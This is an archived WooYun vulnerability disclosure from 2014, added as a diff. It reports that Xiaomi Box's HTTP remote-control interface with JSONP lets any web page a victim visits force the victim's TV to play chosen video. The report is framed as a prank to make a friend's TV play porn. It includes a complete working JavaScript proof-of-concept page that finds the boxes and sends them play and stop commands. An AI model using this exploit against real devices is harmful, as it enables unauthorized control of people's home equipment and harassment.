@@ -1,0 +1,273 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		控制用户小米盒子播放内容(让你不知不觉中播放av)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		控制用户小米盒子播放内容(让你不知不觉中播放av)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/marvin">marvin</a> 
+</li><li>提交时间：		2014-02-14 10:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-24：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-05-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">小米盒子设计缺陷，导致可被攻击控制</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">小米盒子可使用http方式进行远程遥控，接口设计缺陷导致可轻易被攻击。<br />
+<br />
+比如给朋友发个网址，如果他用家里任意电脑或手机啥的打开了，可让他家电视上自动开始播放毛片，神不知鬼不觉。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">利用步骤，以播放视频为例：<br />
+<br />
+1、通过http://pds.duokanbox.com/peer/fetchbyipopen/?mac_address=1&amp;callback=wooyun 接口可获得当前用户的小米盒子列表，和http远程控制ip及端口<br />
+<br />
+2、访问http://ip:port/request?action=isAlive&amp;callback=wooyun 获取盒子状态<br />
+<br />
+3、访问http://ip:port/video/action=play&amp;clientname=PC&amp;url=视频地址&amp;name=test&amp;callback=wooyun，提交播放请求<br />
+<br />
+<br />
+<br />
+同时可发现http://ip:port/controller 接口也可访问，能更多控制。<br />
+<br />
+<br />
+<br />
+演示：http://yekai.me/mitv/。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;!doctype html&gt;<br />
+&lt;html&gt;<br />
+&lt;head&gt;<br />
+	&lt;meta charset=&quot;utf-8&quot;&gt;<br />
+	&lt;title&gt;你有小米盒子么？&lt;/title&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+	&lt;p id=&quot;tips&quot; style=&quot;display:none&quot;&gt;友情提示：播放过程中请不要刷新该页面，会有bug导致电视可能坏掉！&lt;/p&gt;<br />
+	&lt;ul id=&quot;playing&quot;&gt;<br />
+	&lt;/ul&gt;<br />
+	&lt;script type=&quot;text/javascript&quot;&gt;<br />
+	(function(){<br />
+		var testVideo = &#039;http://pl.youku.com/playlist/m3u8?ts=1392311744&amp;keyframe=0&amp;vid=XNjYxNjI1ODQ4&amp;type=hd2&#039;;<br />
+		var randomStr = function(length){<br />
+			var ret = [];<br />
+			length = length || 10;<br />
+			while(length--){<br />
+				ret.push(String.fromCharCode(97 + Math.floor(Math.random()*25)));<br />
+			}<br />
+			return ret.join(&#039;&#039;);<br />
+		};<br />
+		var jsonp = function(url, cb){<br />
+			var s = document.createElement(&#039;script&#039;);<br />
+			if(url.search(&#039;%cb%&#039;) !== -1 &amp;&amp; cb){<br />
+				var fcName = randomStr();<br />
+				window[fcName] = cb;<br />
+				url = url.replace(&#039;%cb%&#039;, fcName);<br />
+			}<br />
+			s.src = url;<br />
+			document.head.appendChild(s);<br />
+		};<br />
+		var $playlist = document.getElementById(&#039;playing&#039;),<br />
+			tips = false;<br />
+		var playingTmpl = function(data){<br />
+			if(!tips){<br />
+				document.getElementById(&#039;tips&#039;).style.display = &#039;block&#039;;<br />
+				tips = true;<br />
+			}<br />
+			var html = &#039;&lt;li&gt;&#039; + data.devicename + &#039; : &lt;button data-tv=&quot;&#039; + data.ip + &#039;&quot;&gt;stop&lt;/button&gt;&lt;/li&gt;&#039;;<br />
+			$playlist.innerHTML += html;<br />
+		};		<br />
+		var MI = {<br />
+			getTvs : function(cb){<br />
+				jsonp(&#039;http://pds.duokanbox.com/peer/fetchbyipopen/?mac_address=1&amp;callback=%cb%&#039;, function(data){<br />
+					if(data &amp;&amp; data.status === 0){<br />
+						cb &amp;&amp; cb(data.data);<br />
+					}<br />
+				});<br />
+			},<br />
+			isActive : function(tv, cb){<br />
+				jsonp(&#039;http://&#039; + tv + &#039;/request?action=isAlive&amp;callback=%cb%&#039;, function(data){<br />
+					if(data &amp;&amp; data.status === 0){<br />
+						cb &amp;&amp; cb(data.data);<br />
+					}<br />
+				});<br />
+			},<br />
+			play : function(tv, video, name, cb){			<br />
+				jsonp(&#039;http://&#039; + tv + &#039;/video/action=play&amp;clientname=PC&amp;url=&#039; + encodeURIComponent(video) + &#039;&amp;name=&#039; + encodeURIComponent(name) + &#039;&amp;callback=%cb%&#039;, <br />
+					function(data){<br />
+						cb &amp;&amp; cb(!data.status);<br />
+				});				<br />
+			},<br />
+			stop : function(tv, cb){<br />
+				jsonp(&#039;http://&#039; + tv + &#039;/controller?action=keyEvent&amp;keyCode=back&amp;callback=%cb%&#039;, function(data){<br />
+						cb &amp;&amp; cb(!data.status);<br />
+				});				<br />
+			}<br />
+		};<br />
+		MI.getTvs(function(tvs){<br />
+			tvs.forEach(function(tv){<br />
+				MI.isActive(tv, function(tvData){<br />
+					if(tvData){<br />
+						MI.play(tvData.ip, testVideo, &#039;随便一个名字&#039;, function(success){<br />
+							success &amp;&amp; playingTmpl(tvData);<br />
+						});<br />
+					}<br />
+				});<br />
+			});<br />
+		});<br />
+		document.addEventListener(&#039;click&#039;, function(e){<br />
+			var target = e.target;<br />
+			if(target.tagName.toLowerCase() === &#039;button&#039;){<br />
+				var tv = target.dataset.tv;<br />
+				MI.stop(tv, function(status){<br />
+					if(status){<br />
+						target.parentNode.parentNode.removeChild(target.parentNode);<br />
+					}<br />
+				});<br />
+			}<br />
+		});<br />
+	})();<br />
+	&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">不使用jsonp可跨站获取数据接口可避免部分问题 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/marvin" title="marvin">marvin</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050904" title="控制用户小米盒子播放内容(让你不知不觉中播放av)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2014-02-24 10:22</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50904";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
